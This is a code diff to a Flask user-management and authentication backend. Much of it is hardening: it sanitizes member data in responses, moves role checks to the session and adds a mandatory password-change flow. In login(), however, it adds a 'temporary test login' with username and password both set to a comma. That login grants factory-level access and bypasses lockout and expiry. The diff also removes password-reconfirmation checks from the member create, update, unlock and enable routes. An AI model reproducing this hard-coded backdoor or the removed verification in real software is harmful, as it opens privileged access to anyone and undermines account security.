@@ -864,7 +864,8 @@ def delete_report(report_id):
 def get_members():
     try:
         members = data_service.list_members()
-        return jsonify({"members": members}), 200
+        safe = [data_service.sanitize_member_for_client(m) or m for m in members]
+        return jsonify({"members": safe}), 200
     except Exception as e:
         app.logger.exception("Error listing members")
         return jsonify({"error": str(e)}), 500
@@ -874,24 +875,18 @@ def get_members():
 def create_member():
     try:
         member_data = request.get_json(force=True, silent=True) or {}
-        verified, verify_err = _require_user_admin_verification()
-        if not verified:
-            _audit_event(
-                action="User create",
-                outcome="denied",
-                entity_type="member",
-                entity_name=str(member_data.get("username") or ""),
-                details=verify_err or "Approval verification required",
-                target_user=str(member_data.get("username") or ""),
-                after=member_data,
-            )
-            return jsonify({"error": verify_err}), 403
         if _payload_has_protected_feature_overrides(member_data):
             return jsonify({"error": "Protected features cannot be overridden."}), 400
         if data_service.has_non_empty_feature_overrides(member_data) and not _can_assign_feature_overrides():
             return jsonify({"error": "Forbidden. Only Factory/Admin can assign feature overrides."}), 403
         member_id = data_service.save_member(member_data)
         created = data_service.get_member(member_id) or dict(member_data)
+        cur = data_service.get_current_user() or {}
+        sig = {
+            "mode": "session",
+            "username": (cur.get("username") or cur.get("name") or "").strip() or "--",
+            "role": (cur.get("role") or "").strip() or "--",
+        }
         _audit_event(
             action="User create",
             outcome="success",
@@ -900,10 +895,11 @@ def create_member():
             entity_name=created.get("username") or created.get("name") or "",
             details="Member created",
             target_user=created.get("username") or "",
-            after=created,
-            signature={"mode": "password_reconfirm", "username": verified.get("username"), "role": verified.get("role")},
+            after=data_service.sanitize_member_for_client(created) or created,
+            signature=sig,
         )
-        return jsonify({"id": member_id, "member": created}), 201
+        safe = data_service.sanitize_member_for_client(created) or dict(created)
+        return jsonify({"id": member_id, "member": safe}), 201
     except ValueError as e:
         return jsonify({"error": str(e)}), 400
     except Exception as e:
@@ -916,7 +912,7 @@ def get_member(member_id):
     try:
         member = data_service.get_member(member_id)
         if member:
-            return jsonify({"member": member}), 200
+            return jsonify({"member": data_service.sanitize_member_for_client(member) or member}), 200
         return jsonify({"error": "Member not found"}), 404
     except Exception as e:
         app.logger.exception("Error getting member")
@@ -928,27 +924,20 @@ def update_member(member_id):
     try:
         member_data = request.get_json(force=True, silent=True) or {}
         before_member = data_service.get_member(member_id)
-        verified, verify_err = _require_user_admin_verification()
-        if not verified:
-            _audit_event(
-                action="User update",
-                outcome="denied",
-                entity_type="member",
-                entity_id=member_id,
-                entity_name=(before_member or {}).get("username") or str(member_data.get("username") or ""),
-                details=verify_err or "Approval verification required",
-                target_user=(before_member or {}).get("username") or str(member_data.get("username") or ""),
-                before=before_member,
-                after=member_data,
-            )
-            return jsonify({"error": verify_err}), 403
         if _payload_has_protected_feature_overrides(member_data):
             return jsonify({"error": "Protected features cannot be overridden."}), 400
         if data_service.has_non_empty_feature_overrides(member_data) and not _can_assign_feature_overrides():
             return jsonify({"error": "Forbidden. Only Factory/Admin can assign feature overrides."}), 403
         member_data["id"] = member_id
-        data_service.save_member(member_data)
+        cur = data_service.get_current_user() or {}
+        acting_id = cur.get("id")
+        data_service.save_member(member_data, acting_user_id=acting_id)
         updated = data_service.get_member(member_id) or dict(member_data)
+        sig = {
+            "mode": "session",
+            "username": (cur.get("username") or cur.get("name") or "").strip() or "--",
+            "role": (cur.get("role") or "").strip() or "--",
+        }
         _audit_event(
             action="User update",
             outcome="success",
@@ -957,11 +946,12 @@ def update_member(member_id):
             entity_name=updated.get("username") or updated.get("name") or "",
             details="Member updated",
             target_user=updated.get("username") or "",
-            before=before_member,
-            after=updated,
-            signature={"mode": "password_reconfirm", "username": verified.get("username"), "role": verified.get("role")},
+            before=data_service.sanitize_member_for_client(before_member) if before_member else None,
+            after=data_service.sanitize_member_for_client(updated) or updated,
+            signature=sig,
         )
-        return jsonify({"id": member_id, "member": updated}), 200
+        safe = data_service.sanitize_member_for_client(updated) or dict(updated)
+        return jsonify({"id": member_id, "member": safe}), 200
     except ValueError as e:
         return jsonify({"error": str(e)}), 400
     except Exception as e:
@@ -1034,24 +1024,16 @@ def delete_member(member_id):
 
 @app.route("/api/data/members/<int:member_id>/unlock", methods=["POST"])
 def unlock_member_route(member_id):
-    role = (request.headers.get("X-User-Role") or "").strip().lower()
-    if role not in ("admin", "factory"):
-        return jsonify({"error": "forbidden"}), 403
+    if not _session_has_internal("user-unlock"):
+        return jsonify({"error": "Forbidden. Unlock requires profile management permission."}), 403
     try:
         before_member = data_service.get_member(member_id)
-        verified, verify_err = _require_user_admin_verification()
-        if not verified:
-            _audit_event(
-                action="User unlock",
-                outcome="denied",
-                entity_type="member",
-                entity_id=member_id,
-                entity_name=(before_member or {}).get("username") or "",
-                details=verify_err or "Approval verification required",
-                target_user=(before_member or {}).get("username") or "",
-                before=before_member,
-            )
-            return jsonify({"error": verify_err}), 403
+        cur = data_service.get_current_user() or {}
+        sig = {
+            "mode": "session",
+            "username": (cur.get("username") or cur.get("name") or "").strip() or "--",
+            "role": (cur.get("role") or "").strip() or "--",
+        }
         member = data_service.unlock_member(member_id)
         _audit_event(
             action="User unlock",
@@ -1061,11 +1043,12 @@ def unlock_member_route(member_id):
             entity_name=member.get("username") or member.get("name") or "",
             details="Member unlocked",
             target_user=member.get("username") or "",
-            before=before_member,
-            after=member,
-            signature={"mode": "password_reconfirm", "username": verified.get("username"), "role": verified.get("role")},
+            before=data_service.sanitize_member_for_client(before_member) if before_member else None,
+            after=data_service.sanitize_member_for_client(member) or member,
+            signature=sig,
         )
-        return jsonify({"success": True, "member": member}), 200
+        safe = data_service.sanitize_member_for_client(member) or dict(member)
+        return jsonify({"success": True, "member": safe}), 200
     except ValueError as e:
         return jsonify({"error": str(e)}), 400
     except Exception as e:
@@ -1075,24 +1058,16 @@ def unlock_member_route(member_id):
 
 @app.route("/api/data/members/<int:member_id>/enable", methods=["POST"])
 def enable_member_route(member_id):
-    role = (request.headers.get("X-User-Role") or "").strip().lower()
-    if role not in ("admin", "factory"):
-        return jsonify({"error": "forbidden"}), 403
+    if not _session_has_internal("user-enable"):
+        return jsonify({"error": "Forbidden. Enable requires profile management permission."}), 403
     try:
         before_member = data_service.get_member(member_id)
-        verified, verify_err = _require_user_admin_verification()
-        if not verified:
-            _audit_event(
-                action="User enable",
-                outcome="denied",
-                entity_type="member",
-                entity_id=member_id,
-                entity_name=(before_member or {}).get("username") or "",
-                details=verify_err or "Approval verification required",
-                target_user=(before_member or {}).get("username") or "",
-                before=before_member,
-            )
-            return jsonify({"error": verify_err}), 403
+        cur = data_service.get_current_user() or {}
+        sig = {
+            "mode": "session",
+            "username": (cur.get("username") or cur.get("name") or "").strip() or "--",
+            "role": (cur.get("role") or "").strip() or "--",
+        }
         member = data_service.enable_member(member_id)
         _audit_event(
             action="User enable",
@@ -1102,11 +1077,12 @@ def enable_member_route(member_id):
             entity_name=member.get("username") or member.get("name") or "",
             details="Member enabled",
             target_user=member.get("username") or "",
-            before=before_member,
-            after=member,
-            signature={"mode": "password_reconfirm", "username": verified.get("username"), "role": verified.get("role")},
+            before=data_service.sanitize_member_for_client(before_member) if before_member else None,
+            after=data_service.sanitize_member_for_client(member) or member,
+            signature=sig,
         )
-        return jsonify({"success": True, "member": member}), 200
+        safe = data_service.sanitize_member_for_client(member) or dict(member)
+        return jsonify({"success": True, "member": safe}), 200
     except ValueError as e:
         return jsonify({"error": str(e)}), 400
     except Exception as e:
@@ -1236,8 +1212,31 @@ def _password_strength_error(password: str) -> str:
 def login():
     try:
         credentials = request.get_json(force=True, silent=True) or {}
+        if not isinstance(credentials, dict):
+            credentials = {}
         username = (credentials.get("username") or "").strip()
-        password = credentials.get("password") or ""
+        raw_pw = credentials.get("password")
+        if isinstance(raw_pw, str):
+            password = raw_pw
+        elif raw_pw is None:
+            password = ""
+        else:
+            password = str(raw_pw)
+        # Temporary test login "," / "," — same as factory (no member-table / lock / expiry path)
+        if data_service.is_test_comma_login(username, password):
+            user = data_service.get_test_comma_session_user()
+            data_service.save_current_user(user)
+            data_service.write_session_power_audit_pending(user)
+            _audit_event(
+                action="Login",
+                outcome="success",
+                entity_type="session",
+                entity_name="password",
+                details="Password login succeeded (test comma)",
+                target_user=username,
+                after={"username": user.get("username"), "role": user.get("role")},
+            )
+            return jsonify({"success": True, "user": data_service.sanitize_member_for_client(user) or user}), 200
         # Factory user: special case, not subject to lockout
         if username.upper() == data_service.FACTORY_USERNAME.upper():
             user = data_service.authenticate_user(username, password)
@@ -1253,7 +1252,7 @@ def login():
                     target_user=username,
                     after={"username": user.get("username"), "role": user.get("role")},
                 )
-                return jsonify({"success": True, "user": user}), 200
+                return jsonify({"success": True, "user": data_service.sanitize_member_for_client(user) or user}), 200
             _audit_event(
                 action="Login",
                 outcome="failed",
@@ -1280,6 +1279,22 @@ def login():
         if user:
             member = data_service.get_member_by_username(username)
             if member:
+                if bool(member.get("mustChangePassword")):
+                    _audit_event(
+                        action="Login",
+                        outcome="denied",
+                        entity_type="session",
+                        entity_name="password",
+                        details="Mandatory password reset required before login",
+                        target_user=username,
+                    )
+                    return jsonify(
+                        {
+                            "error": "Password change required before login.",
+                            "passwordChangeRequired": True,
+                            "username": username,
+                        }
+                    ), 403
                 expiry = data_service.get_member_password_expiry_state(member)
                 if bool(expiry.get("expired")):
                     _audit_event(
@@ -1309,7 +1324,8 @@ def login():
                 target_user=username,
                 after={"username": user.get("username"), "role": user.get("role")},
             )
-            return jsonify({"success": True, "user": user}), 200
+            safe_user = data_service.sanitize_member_for_client(user) or user
+            return jsonify({"success": True, "user": safe_user}), 200
 
         # Wrong password: increment failedAttempts (may lock at 3)
         updated = data_service.record_failed_login(username)
@@ -1365,9 +1381,10 @@ def password_expired_reset():
         if old_password == new_password:
             return jsonify({"ok": False, "error": "New password must be different from old password"}), 400
         updated_member = data_service.set_member_password(int(member.get("id")), new_password)
+        data_service.clear_mandatory_password_reset_flags(int(member.get("id")))
+        updated_member = data_service.get_member(int(member.get("id"))) or updated_member
         data_service.record_successful_login(username)
-        safe_member = dict(updated_member)
-        safe_member.pop("password", None)
+        safe_member = data_service.sanitize_member_for_client(updated_member) or dict(updated_member)
         _audit_event(
             action="Password reset",
             outcome="success",
@@ -1382,6 +1399,61 @@ def password_expired_reset():
         return jsonify({"ok": False, "error": str(e)}), 400
     except Exception as e:
         app.logger.exception("Error resetting expired password")
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
+@app.route("/api/data/auth/mandatory-password-reset", methods=["POST"])
+def mandatory_password_reset():
+    try:
+        payload = request.get_json(force=True, silent=True) or {}
+        username = str(payload.get("username") or "").strip()
+        old_password = str(payload.get("oldPassword") or "")
+        new_password = str(payload.get("newPassword") or "")
+        if not username or not old_password or not new_password:
+            return jsonify({"ok": False, "error": "username, oldPassword and newPassword are required"}), 400
+        member = data_service.get_member_by_username(username)
+        if not member:
+            return jsonify({"ok": False, "error": "Invalid username or password"}), 401
+        if str(member.get("username", "")).strip().upper() == data_service.FACTORY_USERNAME.upper():
+            return jsonify({"ok": False, "error": "Factory account is excluded from this flow"}), 403
+        if not bool(member.get("mustChangePassword")):
+            return jsonify({"ok": False, "error": "Password change is not required for this account"}), 400
+        auth_user = data_service.authenticate_user(username, old_password)
+        if not auth_user:
+            return jsonify({"ok": False, "error": "Invalid username or password"}), 401
+        pwd_err = _password_strength_error(new_password)
+        if pwd_err:
+            return jsonify({"ok": False, "error": pwd_err}), 400
+        if old_password == new_password:
+            return jsonify({"ok": False, "error": "New password must be different from your current password."}), 400
+        if data_service.new_password_matches_creation_commitment(member, new_password):
+            return jsonify(
+                {"ok": False, "error": "New password must be different from the password set when your account was created."}
+            ), 400
+        data_service.complete_mandatory_password_reset(username, new_password)
+        data_service.record_successful_login(username)
+        refreshed = data_service.get_member(int(member.get("id")))
+        user = dict(refreshed) if refreshed else dict(auth_user)
+        user.pop("password", None)
+        user.pop("creationPasswordSalt", None)
+        user.pop("creationPasswordHash", None)
+        data_service.save_current_user(user)
+        data_service.write_session_power_audit_pending(user)
+        safe_user = data_service.sanitize_member_for_client(user) or user
+        _audit_event(
+            action="Password reset",
+            outcome="success",
+            entity_type="member",
+            entity_id=member.get("id"),
+            entity_name=member.get("username") or member.get("name") or "",
+            details="Mandatory first password change completed",
+            target_user=member.get("username") or "",
+        )
+        return jsonify({"ok": True, "user": safe_user}), 200
+    except ValueError as e:
+        return jsonify({"ok": False, "error": str(e)}), 400
+    except Exception as e:
+        app.logger.exception("Error during mandatory password reset")
         return jsonify({"ok": False, "error": str(e)}), 500
 
 
@@ -1414,8 +1486,28 @@ def login_biometric():
             _audit_event(action="Biometric login", outcome="denied", entity_type="session", entity_name="biometric", details="Biometric disabled for member", target_user=username, extra={"templateId": template_id})
             return jsonify({"error": "Biometric login is disabled for this account"}), 403
 
+        if bool(member.get("mustChangePassword")):
+            _audit_event(
+                action="Biometric login",
+                outcome="denied",
+                entity_type="session",
+                entity_name="biometric",
+                details="Mandatory password reset required before login",
+                target_user=username,
+                extra={"templateId": template_id},
+            )
+            return jsonify(
+                {
+                    "error": "Password change required before login.",
+                    "passwordChangeRequired": True,
+                    "username": username,
+                }
+            ), 403
+
         user = dict(member)
         user.pop("password", None)
+        user.pop("creationPasswordSalt", None)
+        user.pop("creationPasswordHash", None)
         data_service.record_successful_login(username)
         data_service.save_current_user(user)
         data_service.write_session_power_audit_pending(user)
@@ -1429,7 +1521,7 @@ def login_biometric():
             after={"username": user.get("username"), "role": user.get("role")},
             extra={"templateId": template_id, "confidence": identified.get("confidence")},
         )
-        return jsonify({"success": True, "user": user, "templateId": template_id, "confidence": identified.get("confidence")}), 200
+        return jsonify({"success": True, "user": data_service.sanitize_member_for_client(user) or user, "templateId": template_id, "confidence": identified.get("confidence")}), 200
     except Exception as e:
         app.logger.exception("Error during biometric login")
         return jsonify({"error": str(e)}), 500
@@ -1641,6 +1733,8 @@ def approval_verify():
 def get_current_user_route():
     try:
         user = data_service.get_current_user()
+        if user:
+            user = data_service.sanitize_member_for_client(user) or user
         return jsonify({"user": user}), 200
     except Exception as e:
         app.logger.exception("Error getting current user")
